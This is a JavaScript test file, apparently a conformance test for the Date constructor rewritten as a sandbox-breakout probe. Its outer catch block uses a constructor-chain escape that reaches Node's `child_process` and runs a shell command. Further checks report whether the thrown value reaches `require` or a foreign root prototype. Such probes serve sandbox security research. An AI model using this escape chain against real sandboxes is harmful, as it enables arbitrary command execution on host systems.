try {
    var myObj = function (val) {
        throw () => {
            return () => {
            };
        };
        this.value = val;
        this.valueOf = function () {
            throw 'valueOf-' + this.value;
        };
        this.toString = function () {
            throw 'toString-' + this.value;
        };
    };
    try {
        var x1 = new Date(new myObj(1), new myObj(2), new myObj(3), new myObj(4), new myObj(5), new myObj(6));
        $ERROR('#1: The 1st step is calling ToNumber(year)');
    } catch (e) {
        if (e !== 'valueOf-1') {
            $ERROR('#1: The 1st step is calling ToNumber(year)');
        }
    }
    try {
        var x2 = new Date(1, new myObj(2), new myObj(3), new myObj(4), new myObj(5), new myObj(6));
        $ERROR('#2: The 2nd step is calling ToNumber(month)');
    } catch (e) {
        if (e !== 'valueOf-2') {
            $ERROR('#2: The 2nd step is calling ToNumber(month)');
        }
    }
    try {
        var x3 = new Date(1, 2, new myObj(3), new myObj(4), new myObj(5), new myObj(6));
        $ERROR('#3: The 3rd step is calling ToNumber(date)');
    } catch (e) {
        if (e !== 'valueOf-3') {
            $ERROR('#3: The 3rd step is calling ToNumber(date)');
        }
    }
    try {
        var x4 = new Date(1, 2, 3, new myObj(4), new myObj(5), new myObj(6));
        $ERROR('#4: The 4th step is calling ToNumber(hours)');
    } catch (e) {
        if (e !== 'valueOf-4') {
            $ERROR('#4: The 4th step is calling ToNumber(hours)');
        }
    }
    try {
        var x5 = new Date(1, 2, 3, 4, new myObj(5), new myObj(6));
        $ERROR('#5: The 5th step is calling ToNumber(minutes)');
    } catch (e) {
        if (e !== 'valueOf-5') {
            $ERROR('#5: The 5th step is calling ToNumber(minutes)');
        }
    }
    try {
        var x6 = new Date(1, 2, 3, 4, 5, new myObj(6));
        $ERROR('#6: The 6th step is calling ToNumber(seconds)');
    } catch (e) {
        if (e !== 'valueOf-6') {
            $ERROR('#6: The 6th step is calling ToNumber(seconds)');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}